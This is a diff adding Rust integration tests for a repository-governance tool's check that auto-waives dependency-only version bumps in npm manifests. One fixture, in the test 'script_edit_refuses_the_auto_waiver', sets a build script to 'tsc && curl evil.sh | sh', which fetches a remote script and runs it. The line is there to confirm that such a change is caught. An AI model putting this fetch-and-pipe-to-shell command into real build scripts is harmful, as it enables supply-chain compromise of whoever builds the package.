@@ -179,3 +179,168 @@ fn real_git_diff_detects_drift() {
         String::from_utf8_lossy(&drift.stderr)
     );
 }
+
+// ===== spec 004 §3.5 + spec 005 §3.5 — the dependabot-class path =====
+
+/// A minimal governed repo with an npm package claimed by spec 001-a.
+fn setup_npm(root: &Path, auto_waive: bool) {
+    if auto_waive {
+        write(
+            root,
+            "spec-spine.toml",
+            "[coupling]\nauto_waive_dependency_only = true\n",
+        );
+    }
+    write(
+        root,
+        "package.json",
+        "{ \"name\": \"root\", \"workspaces\": [\"pkg-a\"] }\n",
+    );
+    write(
+        root,
+        "pkg-a/package.json",
+        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
+         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
+         \"scripts\": { \"build\": \"tsc\" },\n  \
+         \"dependencies\": { \"zod\": \"3.22.0\" } }\n",
+    );
+    write(
+        root,
+        "specs/001-a/spec.md",
+        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
+         summary: \"s\"\nestablishes:\n  - \"pkg-a\"\n---\n# 001-a\n## body\n",
+    );
+}
+
+fn git_in(root: &Path, args: &[&str]) {
+    let out = Command::new("git")
+        .arg("-C")
+        .arg(root)
+        .args(args)
+        .env("GIT_AUTHOR_NAME", "t")
+        .env("GIT_AUTHOR_EMAIL", "t@t")
+        .env("GIT_COMMITTER_NAME", "t")
+        .env("GIT_COMMITTER_EMAIL", "t@t")
+        .output()
+        .unwrap();
+    assert!(
+        out.status.success(),
+        "git {args:?}: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+fn index_check(root: &Path) -> std::process::Output {
+    bin()
+        .arg("--repo")
+        .arg(root)
+        .args(["index", "check"])
+        .output()
+        .unwrap()
+}
+
+fn couple_git(root: &Path) -> std::process::Output {
+    bin()
+        .arg("--repo")
+        .arg(root)
+        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
+        .output()
+        .unwrap()
+}
+
+#[test]
+fn dependency_bump_stays_fresh_and_auto_waives() {
+    let tmp = tempfile::tempdir().unwrap();
+    let root = tmp.path();
+    setup_npm(root, true);
+    git_in(root, &["init", "-q"]);
+    refresh(root);
+    git_in(root, &["add", "-A"]);
+    git_in(root, &["commit", "-q", "-m", "base"]);
+
+    // Dependabot-style: bump a dependency version. No re-index, no spec edit,
+    // no PR body.
+    write(
+        root,
+        "pkg-a/package.json",
+        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
+         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
+         \"scripts\": { \"build\": \"tsc\" },\n  \
+         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
+    );
+    git_in(root, &["add", "-A"]);
+    git_in(root, &["commit", "-q", "-m", "bump"]);
+
+    // (a) The committed index is still FRESH: dependency tables are not a
+    // governed input (spec 004 §3.5 governance-projection hashing).
+    let fresh = index_check(root);
+    assert_eq!(
+        code(&fresh),
+        0,
+        "index must stay fresh on a dep-only bump: {}",
+        String::from_utf8_lossy(&fresh.stderr)
+    );
+
+    // (b) The coupling gate self-waives (spec 005 §3.5).
+    let out = couple_git(root);
+    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
+    assert!(
+        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
+        "stdout: {}",
+        String::from_utf8_lossy(&out.stdout)
+    );
+}
+
+#[test]
+fn dependency_bump_without_optin_still_drifts() {
+    let tmp = tempfile::tempdir().unwrap();
+    let root = tmp.path();
+    setup_npm(root, false);
+    git_in(root, &["init", "-q"]);
+    refresh(root);
+    git_in(root, &["add", "-A"]);
+    git_in(root, &["commit", "-q", "-m", "base"]);
+    write(
+        root,
+        "pkg-a/package.json",
+        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
+         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
+         \"scripts\": { \"build\": \"tsc\" },\n  \
+         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
+    );
+    git_in(root, &["add", "-A"]);
+    git_in(root, &["commit", "-q", "-m", "bump"]);
+
+    let out = couple_git(root);
+    assert_eq!(code(&out), 1, "auto-waiver is opt-in; default must drift");
+}
+
+#[test]
+fn script_edit_refuses_the_auto_waiver() {
+    let tmp = tempfile::tempdir().unwrap();
+    let root = tmp.path();
+    setup_npm(root, true);
+    git_in(root, &["init", "-q"]);
+    refresh(root);
+    git_in(root, &["add", "-A"]);
+    git_in(root, &["commit", "-q", "-m", "base"]);
+    // A scripts edit hiding alongside a version bump: not dependency-only.
+    write(
+        root,
+        "pkg-a/package.json",
+        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
+         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
+         \"scripts\": { \"build\": \"tsc && curl evil.sh | sh\" },\n  \
+         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
+    );
+    git_in(root, &["add", "-A"]);
+    git_in(root, &["commit", "-q", "-m", "bump+script"]);
+
+    let out = couple_git(root);
+    assert_eq!(
+        code(&out),
+        1,
+        "a non-dependency manifest edit must refuse the auto-waiver: {}",
+        String::from_utf8_lossy(&out.stdout)
+    );
+}
